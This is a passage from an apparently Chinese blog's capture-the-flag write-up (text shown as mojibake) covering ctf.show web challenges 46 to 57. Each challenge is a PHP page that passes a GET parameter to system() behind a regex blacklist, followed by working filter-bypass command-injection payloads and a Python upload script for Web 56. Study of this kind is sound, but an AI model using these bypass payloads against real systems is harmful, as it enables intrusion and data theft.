class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:50:19<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>æŠŠé€šé…ç¬¦ <code>*</code> ä¹Ÿè¿‡æ»¤äº†ï¼Œæ•°å­—ä¹Ÿè¿‡æ»¤äº†ï¼Œé‚£å°±ç”¨ <code>?</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac%09fla?.php%0a<br>?c=tac%09????????%0a<br></code></pre></td></tr></table></figure><h1 id="Web-47"><a href="#Web-47" class="headerlink" title="Web 47"></a>Web 47</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:59:23<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>è™½ç„¶è¿‡æ»¤äº†ä¸€äº›å’Œ <code>cat</code> ç±»ä¼¼ç”¨æ³•çš„å‘½ä»¤ï¼Œä½†æ˜¯è¿˜èƒ½ç”¨ <code>tac/nl</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac%09????????%0a<br>?c=tac&lt;&gt;fla\g.php||<br>?c=tac&lt;&gt;fla&#x27;&#x27;g.php||<br>?c=nl&lt;&gt;fla&#x27;&#x27;g.php||<br>?c=nl&lt;fla&#x27;&#x27;g.php||<br></code></pre></td></tr></table></figure><h1 id="Web-48"><a href="#Web-48" class="headerlink" title="Web 48"></a>Web 48</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:06:20<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿‡æ»¤äº†ä¸€å¤§å †ï¼Œè¿˜æ˜¯å‰©ä¸‹äº† <code>tac/nl</code>ï¼Œpayload å·®ä¸å¤š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac%09fl\ag.php||<br>?c=nl%09fl\ag.php||<br></code></pre></td></tr></table></figure><h1 id="Web-49"><a href="#Web-49" class="headerlink" title="Web 49"></a>Web 49</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:22:43<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤šè¿‡æ»¤äº† <code>%</code>ï¼Œé‚£ä¹ˆç©ºæ ¼å°±ç”¨ <code>&lt;&gt;</code> ä»£æ›¿ï¼Œæˆªæ–­ç”¨ <code>||</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac&lt;&gt;fl\ag.php||<br>?c=nl&lt;&gt;fl\ag.php||<br></code></pre></td></tr></table></figure><h1 id="Web-50"><a href="#Web-50" class="headerlink" title="Web 50"></a>Web 50</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:32:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤šè¿‡æ»¤äº† <code>x09 å’Œ x26</code>ï¼Œpayload è¿˜æ˜¯ä¸€æ ·</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac&lt;&gt;fl\ag.php||<br></code></pre></td></tr></table></figure><h1 id="Web-51"><a href="#Web-51" class="headerlink" title="Web 51"></a>Web 51</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:42:52<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæŠŠ <code>tac</code> è¿‡æ»¤äº†ï¼Œä½†æ˜¯è¿˜èƒ½ç”¨ <code>nl</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=nl&lt;&gt;fl\ag.php||<br></code></pre></td></tr></table></figure><h1 id="Web-52"><a href="#Web-52" class="headerlink" title="Web 52"></a>Web 52</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:50:30<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>æŠŠ <code>&lt;&gt;</code> éƒ½è¿‡æ»¤äº†ï¼Œé‚£å°±ç”¨ <code>$&#123;IFS&#125;</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=ca&#x27;&#x27;t$&#123;IFS&#125;/fl\ag||<br></code></pre></td></tr></table></figure><h1 id="Web-53"><a href="#Web-53" class="headerlink" title="Web 53"></a>Web 53</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 18:21:02<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        echo($c);<br>        $d = system($c);<br>        echo &quot;&lt;br&gt;&quot;.$d;<br>    &#125;else&#123;<br>        echo &#x27;no&#x27;;<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>payload å·®ä¸å¤š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=ca\t$&#123;IFS&#125;fla\g.php<br>?c=ca&#x27;&#x27;t$&#123;IFS&#125;fla&#x27;&#x27;g.php<br></code></pre></td></tr></table></figure><h1 id="Web-54"><a href="#Web-54" class="headerlink" title="Web 54"></a>Web 54</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&lt;?php<br><br>/*<br><span class="hljs-section"># -<span class="hljs-emphasis">*- coding: utf-8 -*</span>-</span><br><span class="hljs-section"># @Author: Lazzaro</span><br><span class="hljs-section"># @Date:   2020-09-05 20:49:30</span><br><span class="hljs-section"># @Last Modified by:   h1xa</span><br><span class="hljs-section"># @Last Modified time: 2020-09-07 19:43:42</span><br><span class="hljs-section"># @email: h1xa@ctfer.com</span><br><span class="hljs-section"># @link: https://ctfer.com</span><br><br><span class="hljs-emphasis">*/</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="hljs-emphasis">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="hljs-emphasis">    if(!preg_match(&quot;/\;|.*</span>c.<span class="hljs-emphasis">*a.*</span>t.<span class="hljs-emphasis">*|.*</span>f.<span class="hljs-emphasis">*l.*</span>a.<span class="hljs-emphasis">*g.*</span>| |[0-9]|\<span class="hljs-emphasis">*|.*</span>m.<span class="hljs-emphasis">*o.*</span>r.<span class="hljs-emphasis">*e.*</span>|.<span class="hljs-emphasis">*w.*</span>g.<span class="hljs-emphasis">*e.*</span>t.<span class="hljs-emphasis">*|.*</span>l.<span class="hljs-emphasis">*e.*</span>s.<span class="hljs-emphasis">*s.*</span>|.<span class="hljs-emphasis">*h.*</span>e.<span class="hljs-emphasis">*a.*</span>d.<span class="hljs-emphasis">*|.*</span>s.<span class="hljs-emphasis">*o.*</span>r.<span class="hljs-emphasis">*t.*</span>|.<span class="hljs-emphasis">*t.*</span>a.<span class="hljs-emphasis">*i.*</span>l.<span class="hljs-emphasis">*|.*</span>s.<span class="hljs-emphasis">*e.*</span>d.<span class="hljs-emphasis">*|.*</span>c.<span class="hljs-emphasis">*u.*</span>t.<span class="hljs-emphasis">*|.*</span>t.<span class="hljs-emphasis">*a.*</span>c.<span class="hljs-emphasis">*|.*</span>a.<span class="hljs-emphasis">*w.*</span>k.<span class="hljs-emphasis">*|.*</span>s.<span class="hljs-emphasis">*t.*</span>r.<span class="hljs-emphasis">*i.*</span>n.<span class="hljs-emphasis">*g.*</span>s.<span class="hljs-emphasis">*|.*</span>o.<span class="hljs-emphasis">*d.*</span>|.<span class="hljs-emphasis">*c.*</span>u.<span class="hljs-emphasis">*r.*</span>l.<span class="hljs-emphasis">*|.*</span>n.<span class="hljs-emphasis">*l.*</span>|.<span class="hljs-emphasis">*s.*</span>c.<span class="hljs-emphasis">*p.*</span>|.<span class="hljs-emphasis">*r.*</span>m.<span class="hljs-emphasis">*|\`|\%|\x09|\x26|\&gt;|\<span class="language-xml">&lt;/i&quot;, $c))&#123;</span></span><br><span class="language-xml"><span class="hljs-emphasis">        system($c);</span></span><br><span class="language-xml"><span class="hljs-emphasis">    &#125;</span></span><br><span class="language-xml"><span class="hljs-emphasis">&#125;else&#123;</span></span><br><span class="language-xml"><span class="hljs-emphasis">    highlight_file(__FILE__);</span></span><br><span class="language-xml"><span class="hljs-emphasis">&#125;</span></span><br></code></pre></td></tr></table></figure><p>çœ‹åˆ°é¢˜ç›®æ‡µäº†ä¸€ä¸‹ï¼Œå‰é¢çš„é‚£äº›æ–¹æ³•å·²ç»ä¸è¡Œäº†</p><ol><li><p>æŠŠæ–‡ä»¶å¤åˆ¶åˆ°å½“å‰ç›®å½•ä¸‹ï¼Œç„¶åè®¿é—®ç›®å½•ä¸‹è½½</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=cp$&#123;IFS&#125;f?ag.php$&#123;IFS&#125;./a<br>./a<br></code></pre></td></tr></table></figure></li><li><p>ç”¨é€šé…ç¬¦åŒ¹é… bin ç›®å½•ä¸‹çš„ cat æˆ–è€… tac</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=/bin/ca?$&#123;IFS&#125;f?ag.php<br>?c=/bin/c??$IFS???????? <br></code></pre></td></tr></table></figure></li><li><p>ç”¨ <code>grep</code> æŸ¥æ‰¾å­—ç¬¦ä¸²</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=grep$&#123;IFS&#125;&#x27;fla&#x27;$&#123;IFS&#125;fla?.php<br></code></pre></td></tr></table></figure></li></ol><h1 id="Web-55"><a href="#Web-55" class="headerlink" title="Web 55"></a>Web 55</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 20:03:51<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆå­¦åˆ°äº†ï¼Œå…«è¿›åˆ¶ç»•è¿‡ï¼Œå°†  <code>&#39;&#39;</code> å†…çš„å­—ç¬¦è½¬ä¸ºå…«è¿›åˆ¶ç»•è¿‡</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=$&#x27;cat&#x27; $&#x27;flag.php&#x27;<br>?c=$&#x27;\143\141\164&#x27; $&#x27;\146\154\141\147\56\160\150\160&#x27;<br></code></pre></td></tr></table></figure><h1 id="Web-56"><a href="#Web-56" class="headerlink" title="Web 56*"></a>Web 56*</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ linux ä¸‹ï¼Œ<code>.</code> å¯ä»¥ç”¨æ¥æ‰§è¡Œ <code>.sh</code> è„šæœ¬ï¼Œåœ¨ php ä¸­ï¼Œä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯ <code>/tmp/phpXXXXXX</code>ï¼Œæ–‡ä»¶åæœ€å 6 ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯</p><p>æ‰§è¡Œ <code>/tmp/phpxxxxxx</code> ä¹Ÿä¼šè¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆå¿…é¡»è¦ç”¨é€šé…ç¬¦äº†ï¼Œè¡¨ç¤ºä¸º <code>/*/?????????</code> æˆ–è€… <code>/???/?????????</code>ï¼Œä½†é€šé…çš„æ–‡ä»¶ä¸æ­¢ä¸€ä¸ªï¼Œæ— æ³•æŒ‡å®šæ‰§è¡Œã€‚ä½†ä¸Šä¼ çš„ php ç”Ÿæˆçš„ä¸´æ—¶æ–‡ä»¶åŒ…å«å¤§å†™å­—æ¯ï¼Œåœ¨ ASCII è¡¨ä¸­ï¼Œå¤§å†™å­—æ¯æ’åˆ—åœ¨ <code>@-[</code> ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>[@-[]</code> æ¥è¡¨ç¤ºå¤§å†™å­—æ¯è¿›è¡Œç»•è¿‡</p><p>çœ‹çœ‹ p ç¥çš„æ–‡ç« ï¼Œ <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡ | ç¦»åˆ«æ­Œ (leavesongs.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">import requests<br><br>while True:<br>    url = &quot;http://2b507c86-6191-49f9-92f3-7f75368716d1.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;<br>    r = requests.post(url, files=&#123;&quot;file&quot;: (&#x27;1.php&#x27;, b&#x27;cat flag.php&#x27;)&#125;)<br>    if r.text.find(&quot;flag&quot;) &gt;0:<br>        print(r.text)<br>        break<br></code></pre></td></tr></table></figure><h1 id="Web-57"><a href="#Web-57" class="headerlink" title="Web 57*"></a>Web 57*</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-08 01:02:56<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ<br>//flag in 36.php<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;<br>        system(&quot;cat &quot;.$c.&quot;.php&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>flag åœ¨ 36.phpï¼Œæ„é€  36ï¼Œä½†æ˜¯æ•°å­—è¢«ç¦äº†</p><p>hint ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<br><span class="hljs-variable">$&#123;_&#125;</span> =<span class="hljs-string">&quot;&quot;</span> //è¿”å›ä¸Šä¸€æ¬¡å‘½ä»¤<br>$((<span class="hljs-variable">$&#123;_&#125;</span>))=0<br>$((~$((<span class="hljs-variable">$&#123;_&#125;</span>))))=-1<br></code></pre></td></tr></table></figure><p>å› ä¸º shell ç¼–ç¨‹ä¸­çš„ <code>Shell (())</code>  å‘½ä»¤ä¸­ï¼Œå¯ä»¥å‘ç° <code>echo $(())</code> è¾“å‡ºçš„æ˜¯ 0ï¼Œé‚£ä¹ˆå–åè¾“å‡ºåˆ™æ˜¯ -1ï¼Œä»¥æ­¤ç±»æ¨ï¼ŒæŠŠç»“æœåŠ åˆ° -37 å†å–åå°±èƒ½å¾—åˆ° 36</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# <span class="hljs-built_in">echo</span> $((~<span class="hljs-number">36</span>))<br>-37<br>â””â”€# <span class="hljs-built_in">echo</span> $((~$((-<span class="hljs-number">37</span>))))<br>36<br></code></pre></td></tr></table></figure><p>æˆ‘ç”¨çš„ç¬¨æ–¹æ³•ï¼Œä¸€ç›´åŠ åŠ åŠ </p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 